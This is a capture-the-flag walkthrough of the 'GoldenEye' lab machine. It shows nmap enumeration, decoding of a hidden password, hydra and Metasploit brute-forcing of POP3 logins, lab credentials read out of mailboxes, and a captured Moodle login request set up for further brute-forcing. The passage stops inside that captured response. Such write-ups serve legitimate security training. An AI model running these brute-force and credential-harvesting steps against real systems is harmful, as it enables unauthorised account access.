GOLDENEYE.



[>>> TASK 1: INTRO & ENUMERATION]
[1.1. FIRST THINGS FIRST, CONNECT TO OUR NETWORK AND DEPLOY THE MACHINE]
Nothing to do here.



[1.2. USE NMAP TO SCAN THE NETWORK FOR ALL PORTS. HOW MANY PORTS ARE OPEN?]
[ACTION: quick nmap all ports scan]
nmap -sS -T4 -sV -p- 10.10.77.114
[OUTPUT]
PORT      STATE SERVICE  VERSION
25/tcp    open  smtp     Postfix smtpd
80/tcp    open  http     Apache httpd 2.4.7 ((Ubuntu))
55006/tcp open  ssl/pop3 Dovecot pop3d
55007/tcp open  pop3     Dovecot pop3d
[ANSWER]
4



[1.3. TAKE A LOOK ON THE WEBSITE, TAKE A DIVE INTO THE SOURCE CODE TOO AND REMEMBER TO INSPECT ALL SCRIPTS!]
[ACTION: visit http://10.10.77.114/]
[OUTPUT]
Severnaya Auxiliary Control Station
****TOP SECRET ACCESS****
Accessing Server Identity
Server Name:....................
GOLDENEYE

User: UNKNOWN
Naviagate to /sev-home/ to login	


[ACTION: inspect source http://10.10.77.114/]
[OUTPUT]
<html>
<head>
<title>GoldenEye Primary Admin Server</title>
<link rel="stylesheet" href="index.css">
</head>

	<span id="GoldenEyeText" class="typeing"></span><span class='blinker'>&#32;</span>

<script src="terminal.js"></script>
	
</html>


[ACTION: visit http://10.10.77.114/terminal.js]
[OUTPUT (snippet)]
//
//Boris, make sure you update your default password. 
//My sources say MI6 maybe planning to infiltrate. 
//Be on the lookout for any suspicious network traffic....
//
//I encoded you p@ssword below...
//
//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
//
//BTW Natalya says she can break your codes
//
[NOTE]
Looks like we have an encoded password.
We also know the login portal is at http://10.10.77.114/sev-home/.


[ACTION: visit http://10.10.77.114/sev-home/]
[OUTPUT]
Js popup asking for Username and Password.


[NOTE]
Looks like we need to decode the password to continue.
The encoding appears to be HTML character references.
[ACTION: decode password via https://mothereff.in/html-entities]
input: &#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
[OUTPUT]
InvincibleHack3r


[NOTE]
We have a valid login: Boris|InvincibleHack3r.
Turns out the actual user is "boris", lowercase.
[ACTION: log in as boris to http://10.10.77.114/sev-home/]
[OUTPUT]
GoldenEye
GoldenEye is a Top Secret Soviet oribtal weapons project. Since you have access you definitely hold a Top Secret clearance and qualify to be a certified GoldenEye Network Operator (GNO)

Please email a qualified GNO supervisor to receive the online GoldenEye Operators Training to become an Administrator of the GoldenEye system

Remember, since security by obscurity is very effective, we have configured our pop3 service to run on a very high non-default port



[1.4. WHO NEEDS TO MAKE SURE THEY UPDATE THEIR DEFAULT PASSWORD?]
[ANSWER (based on previous outputs)]
boris



[1.5. WHATS THEIR PASSWORD?]
[ANSWER (based on previous outputs)]
InvincibleHack3r



[1.6. NOW GO USE THOSE CREDENTIALS AND LOGIN TO A PART OF THE SITE]
[NOTE]
We already did it.




[>>> TASK 2: ITS MAIL TIME...]
[2.1. TAKE A LOOK AT SOME OF THE OTHER SERVICES YOU FOUND USING YOUR NMAP SCAN. ARE THESE CREDENTIALS YOU HAVE RE-USABLE?]
[ACTION: connect to ssl/pop3 on port 55006]
openssl s_client -connect 10.10.77.114:55006


[ACTION: attempt login with boris creds]
USER boris
[OUTPUT]
+OK
PASS InvincibleHack3r
[OUTPUT]
-ERR [AUTH] Authentication failed.


[ACTION: connect to pop3 on port 5507]
telnet 10.10.77.114 55007


[ACTION: attempt login with boris creds]
USER boris
[OUTPUT]
+OK
PASS InvincibleHack3r
[OUTPUT]
-ERR [AUTH] Authentication failed.
[NOTE]
We can't connect to smtp on port 25 since it is for sending emails (Simple Mail Transfer Protocol) not receiving (like POP3).
It looks like our credentials only work on the port serving http.



[2.2. IF THOSE CREDS DON'T SEEM TO WORK, CAN YOU USE ANOTHER PROGRAM TO FIND OTHER USERS AND PASSWORDS? MAYBE HYDRA? WHATS THEIR PASSWORD?]
[NOTE]
It looks like we need to start by finding a new user, and then bruteforcing via hydra.
[ACTION: enumerate pop3 users]
msfconsole
search pop3
use scanner/pop3/pop3_login
show options
set RHOSTS 10.10.77.114
set RPORT 55007
run
[NOTE]
No useful output.
We also tried hydra -l boris -P ~/thm/rockyou.txt -s 55007 -vV 10.10.77.114 pop3, with no luck.


[NOTE]
It looks like our user is probably found somewhere else.
In http://10.10.77.114/terminal.js, we found the name Natalya, so we should try to bruteforce her pop3 and http login.
Since rockyou is too long, we will try to use fassttrack instead, for both boris and natalya.


[ACTION: bruteforce natalya pop3]
hydra -l natalya -P /usr/share/wordlists/fasttrack.txt -f 10.10.77.114 -s 55007 pop3
[NOTE]
No useful output.


[ACTION: bruteforce boris pop3]
hydra -l boris -P /usr/share/wordlists/fasttrack.txt -f 10.10.77.114 -s 55007 pop3
[OUTPUT]
[55007][pop3] host: 10.10.77.114   login: boris   password: secret1!
[NOTE]
Looks like we didn't need to find a new username (?)
[ANSWER]
secret1!



[2.3. INSPECT PORT 55007, WHAT SERVICE IS CONFIGURED TO USE THIS PORT?]
[ANSWER (based on output 1.2)]
pop3



[2.4. LOGIN USING THAT SERVICE AND THE CREDENTIALS YOU FOUND EARLIER]
[ACTION: login to pop on port 55007 with found password]
telnet 10.10.77.114
USER boris
PASS secret1!
[OUTPUT]
+OK Logged in.



[2.5. WHAT CAN YOU FIND ON THIS SERVICE?]
[ANSWER]
emails



[2.6. WHAT USER CAN BREAK BORIS' CODES?]
[ACTION: check message list]
LIST
[OUTPUT]
+OK 3 messages:
1 544
2 373
3 921


[ACTION: read message 1]
RETR 1
[OUTPUT]
Return-Path: <root@127.0.0.1.goldeneye>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
	by ubuntu (Postfix) with SMTP id D9E47454B1
	for <boris>; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
Message-Id: <20180425022326.D9E47454B1@ubuntu>
Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
From: root@127.0.0.1.goldeneye

Boris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails for security risks because I trust you and the other admins here.
[NOTE]
Nothing interesting here.


[ACTION: read message 2]
RETR 2
[OUTPUT]
Return-Path: <natalya@ubuntu>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
	by ubuntu (Postfix) with ESMTP id C3F2B454B1
	for <boris>; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
Message-Id: <20180425024249.C3F2B454B1@ubuntu>
Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
From: natalya@ubuntu

Boris, I can break your codes!
.
[NOTE]
Nothing interesting here.
We already knew the answer was natalya from our inspect on the terminal script.
[ANSWER]
natalya



[2.7. USING THE USERS YOU FOUND ON THIS SERVICE, FIND OTHER USERS PASSWORDS]
[NOTE]
We will first read the last message.
[ACTION: read message 3]
RETR 3
[OUTPUT]
Return-Path: <alec@janus.boss>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from janus (localhost [127.0.0.1])
	by ubuntu (Postfix) with ESMTP id 4B9F4454B1
	for <boris>; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
Message-Id: <20180425025235.4B9F4454B1@ubuntu>
Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
From: alec@janus.boss

Boris,

Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!

Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....

PS - Keep security tight or we will be compromised.
[NOTE]
We find a bunch of strings that could be users: root, admin, natalya, janus, alec


[ACTION: end pop3 session]
QUIT


[ACTION: create user list]
echo -e "root\nadmin\nnatalya\njanus\nalec" > pop3_user_list.txt


[ACTION: bruteforce pop3 user list]
hydra -L pop3_user_list.txt -P /usr/share/wordlists/fasttrack.txt -f 10.10.77.114 -s 55007 pop3
[OUTPUT]
[55007][pop3] host: 10.10.77.114   login: natalya   password: bird


[ACTION: login to pop3 on port 55007 with found natalya password]
telnet 10.10.77.114 55007
USER natalya
PASS bird


[ACTION: check message list]
LIST
[OUTPUT]
1 631
2 1048


[ACTION: read message 1]
RETR 1
[OUTPUT]
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from ok (localhost [127.0.0.1])
	by ubuntu (Postfix) with ESMTP id D5EDA454B1
	for <natalya>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
Message-Id: <20180425024542.D5EDA454B1@ubuntu>
Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
From: root@ubuntu

Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.

Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.


[ACTION: read message 2]
RETR 2
[OUTPUT]
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from root (localhost [127.0.0.1])
	by ubuntu (Postfix) with SMTP id 17C96454B1
	for <natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
Message-Id: <20180425031956.17C96454B1@ubuntu>
Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
From: root@ubuntu

Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)

Ok, user creds are:

username: xenia
password: RCP90rulez!

Boris verified her as a valid contractor so just create the account ok?

And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network....

Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
[NOTE]
We found the password for xenia: RCP90rulez!
They also mention a url: evernaya-station.com/gnocertdir


[ACTION: log in to pop3 as xenia]
telnet 10.10.77.114
USER xenia
PASS RCP90rulez!
[OUTPUT]
-ERR [AUTH] Authentication failed.
[NOTE]
Looks like the creds aren't for pop3.




[>>> TASK 3: GOLDENEYE OPERATORS TRAINING]
[ACTION: update dns record]
1. sudo nano /etc/hosts
2. Add line: 10.10.77.114 severnaya-station.com
 


[1.2. ONCE YOU HAVE DONE THAT, IN YOUR BROWSER NAVIGATE TO: http://severnaya-station.com/gnocertdir]
[ACTION: visit http://severnaya-station.com/gnocertdir/]
[OUTPUT]
GoldenEye operator training landing site.



[1.3. TRY USING THE CREDENTIALS YOU FOUND EARLIER. WHICH USER CAN YOU LOGIN AS?]
[NOTE]
We click the top-right login button, redirecting to http://severnaya-station.com/gnocertdir/login/index.php.
[ACTION: log in using xenia|RCP90rulez!]
[ANSWER]
xenia



[1.4. HAVE A POKE AROUND THE SITE. WHAT OTHER USERS CAN YOU FIND?]
[ACTION: explore http://severnaya-station.com/gnocertdir/]
Using the navigation bar, we land on http://severnaya-station.com/gnocertdir/message/index.php, finding user Dr Doak.
[ANSWER]
doak



[1.5. WHAT WAS THIS USERS PASSWORD?]
[NOTE]
Looks like we need to run hydra on doak user, and login portal http://severnaya-station.com/gnocertdir/login/index.php
I tried to use the web inspector, but the login POST request didn't show up, so I used Burpsuite proxy.
[INFO: wrong login to doak request]
POST /gnocertdir/login/index.php HTTP/1.1
Host: severnaya-station.com
Content-Length: 46
Cache-Control: max-age=0
Origin: http://severnaya-station.com
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://severnaya-station.com/gnocertdir/login/index.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: MOODLEID1_=%25CA%2525%25CB%2513%25B0; MoodleSession=thug8dnn16p7uknkmte3bdgbj6
Connection: keep-alive

username=doak&password=test&rememberusername=1


[INFO: wrong login to doak reply]
HTTP/1.1 200 OK
Date: Sat, 26 Jul 2025 09:06:28 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.24
Expires: 
Cache-Control: private, pre-check=0, post-check=0, max-age=0
Pragma: no-cache
Content-Language: en
Content-Script-Type: text/javascript
Content-Style-Type: text/css
Accept-Ranges: none
X-Frame-Options: sameorigin
Vary: Accept-Encoding
Content-Length: 22795
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=utf-8

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html  dir="ltr" lang="en" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml">
<head>
    <title>GoldenEye Operators Training - Moodle: Login to the site</title>
    <link rel="shortcut icon" href="http://severnaya-station.com/gnocertdir/theme/image.php?theme=standard&amp;image=favicon&amp;rev=281&amp;component=theme" />
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="keywords" content="moodle, GoldenEye Operators Training - Moodle: Login to the site" />
<link rel="stylesheet" type="text/css" href="http://severnaya-station.com/gnocertdir/theme/yui_combo.php?3.4.1/build/cssreset/reset-min.css&amp;3.4.1/build/cssfonts/fonts-min.css&amp;3.4.1/build/cssgrids/grids-min.css&amp;3.4.1/build/cssbase/base-min.css" /><script type="text/javascript" src="http://severnaya-station.com/gnocertdir/lib/yui/3.4.1/build/yui/yui-min.js"></script><script type="text/javascript" src="http://severnaya-station.com/gnocertdir/theme/yui_combo.php?2.9.0/build/yahoo/yahoo-min.js&amp;2.9.0/build/dom/dom-min.js"></script>
<link rel="stylesheet" type="text/css" href="http://severnaya-station.com/gnocertdir/theme/yui_combo.php?2.9.0/build/assets/skins/sam/skin.css" />
<script id="firstthemesheet" type="text/css">/** Required in order to fix style inclusion problems in IE with YUI **/</script><link rel="stylesheet" type="text/css" href="http://severnaya-station.com/gnocertdir/theme/styles.php?theme=standard&amp;rev=281" />
<script type="text/javascript">
//<![CDATA[
var M = {}; M.yui = {}; var moodleConfigFn = function(me) {var p = me.path, b = me.name.replace(/^moodle-/,'').split('-', 3), n = b.pop();if (/(skin|core)/.test(n)) {n = b.pop();me.type = 'css';};me.path = b.join('-')+'/'+n+'/'+n+'.'+me.type;}; var galleryConfigFn = function(me) {var p = me.path,v=M.yui.galleryversion,f;if(/-(skin|core)/.test(me.name)) {me.type = 'css';p = p.replace(/-(skin|core)/, '').replace(/\.js/, '.css').split('/'), f = p.pop().replace(/(\-(min|debug))/, '');if (/-skin/.test(me.name)) {p.splice(p.length,0,v,'assets','skins','sam', f);} else {p.splice(p.length,0,v,'assets', f);};} else {p = p.split('/'), f = p.pop();p.splice(p.length,0,v, f);};me.path = p.join('/');};
M.yui.loader = {"base":"http:\/\/severnaya-station.com\/gnocertdir\/lib\/yui\/3.4.1\/build\/","comboBase":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?","combine":true,"filter":"","insertBefore":"firstthemesheet","modules":{"yui2-event":{"type":"js","requires":["yui2-yahoo"],"fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/event\/event-min.js"},"yui2-animation":{"type":"js","requires":["yui2-dom","yui2-event"],"fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/animation\/animation-min.js"},"yui2-swfstore":{"type":"js","requires":["yui2-element","yui2-cookie","yui2-swf"],"fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/swfstore\/swfstore-min.js"},"yui2-datatable":{"requires":["yui2-element","yui2-datasource"],"type":"js","optional":["yui2-calendar","yui2-dragdrop","yui2-paginator"],"fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/datatable\/datatable-min.js"},"yui2-swfdetect":{"type":"js","requires":["yui2-yahoo"],"fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/swfdetect\/swfdetect-min.js"},"yui2-menu":{"requires":["yui2-containercore"],"type":"js","fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/menu\/menu-min.js"},"yui2-treeview":{"requires":["yui2-event","yui2-dom"],"type":"js","optional":["yui2-json","yui2-animation","yui2-calendar"],"fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/treeview\/treeview-min.js"},"yui2-get":{"type":"js","requires":["yui2-yahoo"],"fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/get\/get-min.js"},"yui2-progressbar":{"requires":["yui2-element"],"type":"js","optional":["yui2-animation"],"fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/progressbar\/progressbar-min.js"},"yui2-uploader":{"type":"js","requires":["yui2-element"],"fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/uploader\/uploader-min.js"},"yui2-datasource":{"requires":["yui2-event"],"type":"js","optional":["yui2-connection"],"fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/datasource\/datasource-min.js"},"yui2-profiler":{"type":"js","requires":["yui2-yahoo"],"fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/profiler\/profiler-min.js"},"yui2-connection":{"supersedes":["yui2-connectioncore"],"requires":["yui2-event"],"type":"js","fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/connection\/connection-min.js"},"yui2-json":{"type":"js","requires":["yui2-yahoo"],"fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/json\/json-min.js"},"yui2-datemath":{"type":"js","requires":["yui2-yahoo"],"fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/datemath\/datemath-min.js"},"yui2-calendar":{"supersedes":["yui2-datemath"],"requires":["yui2-event","yui2-dom"],"type":"js","fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/calendar\/calendar-min.js"},"yui2-simpleeditor":{"requires":["yui2-element"],"type":"js","optional":["yui2-containercore","yui2-menu","yui2-button","yui2-animation","yui2-dragdrop"],"pkg":"editor","fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/editor\/simpleeditor-min.js"},"yui2-swf":{"supersedes":["yui2-swfdetect"],"requires":["yui2-element"],"type":"js","fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/swf\/swf-min.js"},"yui2-event-simulate":{"type":"js","requires":["yui2-event"],"fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/event-simulate\/event-simulate-min.js"},"yui2-yuiloader-dom-event":{"supersedes":["yui2-yahoo","yui2-dom","yui2-event","yui2-get","yui2-yuiloader","yui2-yahoo-dom-event"],"rollup":5,"type":"js","fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/yuiloader-dom-event\/yuiloader-dom-event.js"},"yui2-storage":{"requires":["yui2-yahoo","yui2-event","yui2-cookie"],"type":"js","optional":["yui2-swfstore"],"fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/storage\/storage-min.js"},"yui2-container":{"supersedes":["yui2-containercore"],"requires":["yui2-dom","yui2-event"],"type":"js","optional":["yui2-dragdrop","yui2-animation","yui2-connection"],"fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/container\/container-min.js"},"yui2-profilerviewer":{"requires":["yui2-profiler","yui2-yuiloader","yui2-element"],"type":"js","fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/profilerviewer\/profilerviewer-min.js"},"yui2-imagecropper":{"requires":["yui2-dragdrop","yui2-element","yui2-resize"],"type":"js","fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/imagecropper\/imagecropper-min.js"},"yui2-paginator":{"requires":["yui2-element"],"type":"js","fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/paginator\/paginator-min.js"},"yui2-tabview":{"requires":["yui2-element"],"type":"js","optional":["yui2-connection"],"fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/tabview\/tabview-min.js"},"yui2-layout":{"requires":["yui2-element"],"type":"js","optional":["yui2-animation","yui2-dragdrop","yui2-resize","yui2-selector"],"fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/layout\/layout-min.js"},"yui2-imageloader":{"type":"js","requires":["yui2-event","yui2-dom"],"fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/imageloader\/imageloader-min.js"},"yui2-containercore":{"requires":["yui2-dom","yui2-event"],"type":"js","pkg":"container","fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/container\/container_core-min.js"},"yui2-event-mouseenter":{"type":"js","requires":["yui2-dom","yui2-event"],"fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/event-mouseenter\/event-mouseenter-min.js"},"yui2-logger":{"requires":["yui2-event","yui2-dom"],"type":"js","optional":["yui2-dragdrop"],"fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/logger\/logger-min.js"},"yui2-cookie":{"type":"js","requires":["yui2-yahoo"],"fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/cookie\/cookie-min.js"},"yui2-stylesheet":{"type":"js","requires":["yui2-yahoo"],"fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/stylesheet\/stylesheet-min.js"},"yui2-connectioncore":{"requires":["yui2-event"],"type":"js","pkg":"connection","fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/connection\/connection_core-min.js"},"yui2-utilities":{"supersedes":["yui2-yahoo","yui2-event","yui2-dragdrop","yui2-animation","yui2-dom","yui2-connection","yui2-element","yui2-yahoo-dom-event","yui2-get","yui2-yuiloader","yui2-yuiloader-dom-event"],"rollup":8,"type":"js","fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/utilities\/utilities.js"},"yui2-dragdrop":{"type":"js","requires":["yui2-dom","yui2-event"],"fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/dragdrop\/dragdrop-min.js"},"yui2-colorpicker":{"requires":["yui2-slider","yui2-element"],"type":"js","optional":["yui2-animation"],"fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/colorpicker\/colorpicker-min.js"},"yui2-event-delegate":{"requires":["yui2-event"],"type":"js","optional":["yui2-selector"],"fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/event-delegate\/event-delegate-min.js"},"yui2-yuiloader":{"type":"js","supersedes":["yui2-yahoo","yui2-get"],"fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/yuiloader\/yuiloader-min.js"},"yui2-button":{"requires":["yui2-element"],"type":"js","optional":["yui2-menu"],"fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/button\/button-min.js"},"yui2-resize":{"requires":["yui2-dragdrop","yui2-element"],"type":"js","optional":["yui2-animation"],"fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/resize\/resize-min.js"},"yui2-element":{"requires":["yui2-dom","yui2-event"],"type":"js","optional":["yui2-event-mouseenter","yui2-event-delegate"],"fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/element\/element-min.js"},"yui2-history":{"type":"js","requires":["yui2-event"],"fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/history\/history-min.js"},"yui2-yahoo":{"type":"js","fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/yahoo\/yahoo-min.js"},"yui2-element-delegate":{"type":"js","requires":["yui2-element"],"fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/element-delegate\/element-delegate-min.js"},"yui2-charts":{"type":"js","requires":["yui2-element","yui2-json","yui2-datasource","yui2-swf"],"fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/charts\/charts-min.js"},"yui2-slider":{"requires":["yui2-dragdrop"],"type":"js","optional":["yui2-animation"],"fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/slider\/slider-min.js"},"yui2-selector":{"type":"js","requires":["yui2-yahoo","yui2-dom"],"fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/selector\/selector-min.js"},"yui2-yuitest":{"requires":["yui2-logger"],"type":"js","optional":["yui2-event-simulate"],"fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/yuitest\/yuitest-min.js"},"yui2-carousel":{"requires":["yui2-element"],"type":"js","optional":["yui2-animation"],"fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/carousel\/carousel-min.js"},"yui2-autocomplete":{"requires":["yui2-dom","yui2-event","yui2-datasource"],"type":"js","optional":["yui2-connection","yui2-animation"],"fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/autocomplete\/autocomplete-min.js"},"yui2-yahoo-dom-event":{"supersedes":["yui2-yahoo","yui2-event","yui2-dom"],"rollup":3,"type":"js","fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/yahoo-dom-event\/yahoo-dom-event.js"},"yui2-dom":{"type":"js","requires":["yui2-yahoo"],"fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/dom\/dom-min.js"},"yui2-editor":{"supersedes":["yui2-simpleeditor"],"requires":["yui2-menu","yui2-element","yui2-button"],"type":"js","optional":["yui2-animation","yui2-dragdrop"],"fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?2.9.0\/build\/editor\/editor-min.js"},"core_filepicker":{"name":"core_filepicker","fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/lib\/javascript.php?file=%2Frepository%2Ffilepicker.js&rev=280","requires":["base","node","node-event-simulate","json","async-queue","io-base","io-upload-iframe","io-form","yui2-button","yui2-container","yui2-layout","yui2-menu","yui2-treeview","yui2-dragdrop","yui2-cookie"]},"core_dock":{"name":"core_dock","fullpath":"http:\/\/severnaya-station.com\/gnocertdir\/lib\/javascript.php?file=%2Fblocks%2Fdock.js&rev=280","requires":["base","node","event-custom","event-mouseenter","event-resize"]}},"groups":{"moodle":{"name":"moodle","base":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?moodle\/280\/","comboBase":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?","combine":true,"filter":"","ext":false,"root":"moodle\/280\/","patterns":{"moodle-":{"group":"moodle","configFn":moodleConfigFn},"root":"moodle"}},"local":{"name":"gallery","base":"http:\/\/severnaya-station.com\/gnocertdir\/lib\/yui\/gallery\/","comboBase":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/yui_combo.php?","combine":true,"filter":"","ext":false,"root":"gallery\/","patterns":{"gallery-":{"group":"gallery","configFn":galleryConfigFn},"root":"gallery"}}}};
M.cfg = {"wwwroot":"http:\/\/severnaya-station.com\/gnocertdir","sesskey":"v70aU5snnb","loadingicon":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/image.php?theme=standard&image=i%2Floading_small&rev=281","themerev":"281","theme":"standard","jsrev":"280"};
//]]>
</script>
<script type="text/javascript" src="http://severnaya-station.com/gnocertdir/lib/javascript.php?file=%2Flib%2Fjavascript-static.js&amp;rev=280"></script>
<script type="text/javascript" src="http://severnaya-station.com/gnocertdir/theme/javascript.php?theme=standard&amp;rev=281&amp;type=head"></script>
</head>
<body id="page-login-index" class=" path-login safari dir-ltr lang-en yui-skin-sam yui3-skin-sam severnaya-station-com--gnocertdir pagelayout-login course-1 context-1 notloggedin content-only">
<div class="skiplinks"><a class="skip" href="#maincontent">Skip to main content</a></div>
<script type="text/javascript">
//<![CDATA[
document.body.className += ' jsenabled';
//]]>
</script>

<div id="page">
    <div id="page-header">
                <h1 class="headermain">GoldenEye Operators Training - Moodle</h1>
        <div class="headermenu"><div class="logininfo">You are not logged in.</div></div>                            <div class="navbar clearfix">
